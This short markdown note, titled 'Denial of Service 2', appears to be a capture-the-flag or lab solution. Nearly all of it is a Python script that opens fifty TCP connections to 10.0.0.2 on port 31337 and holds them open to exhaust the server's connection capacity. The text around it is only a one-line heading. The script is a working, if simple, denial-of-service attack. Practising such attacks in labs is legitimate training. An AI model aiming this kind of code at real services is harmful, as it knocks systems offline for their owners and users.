# Denial of Service 2

#### Need to flood the server:
```python
import socket
import time

target = ("10.0.0.2", 31337)
sockets = []

for i in range(50):
    s = socket.create_connection(target, timeout=1)
    sockets.append(s)
    time.sleep(.05)
    
input("No connecting... \n")
```
